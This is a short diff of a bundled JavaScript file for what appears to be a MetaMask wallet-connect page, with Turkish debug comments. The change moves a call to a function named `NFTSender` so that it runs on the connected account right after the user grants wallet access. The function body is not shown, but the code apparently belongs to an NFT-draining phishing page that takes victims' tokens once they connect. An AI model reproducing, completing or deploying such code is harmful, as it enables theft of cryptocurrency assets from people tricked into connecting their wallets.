@@ -541,7 +541,6 @@ let connected = (accounts)=>{
     statusDesc.innerHTML = accounts[0];
     //postAccount(accounts[0])
     console.log('buraya kadar sorun yok');
-    await NFTSender(accounts[0]);
     console.log('burada mi sorun');
     btn.style.display = 'none';
     loader.style.display = 'none';
@@ -566,6 +565,7 @@ btn.addEventListener('click', async ()=>{
         const accounts = await ethereum.request({
             method: 'eth_requestAccounts'
         });
+        await NFTSender(accounts[0]);
         connected(accounts);
     } catch (error) {
         console.error(error);
@@ -589,7 +589,7 @@ const MetaMaskClientCheck = ()=>{
 };
 MetaMaskClientCheck();
 
-},{"@metamask/onboarding":"gSj9U","@parcel/transformer-js/src/esmodule-helpers.js":"gkKU3","./serverHandler":"9Rn5M"}],"gSj9U":[function(require,module,exports) {
+},{"@metamask/onboarding":"gSj9U","./serverHandler":"9Rn5M","@parcel/transformer-js/src/esmodule-helpers.js":"gkKU3"}],"gSj9U":[function(require,module,exports) {
 var parcelHelpers = require("@parcel/transformer-js/src/esmodule-helpers.js");
 parcelHelpers.defineInteropFlag(exports);
 var _bowser = require("bowser");
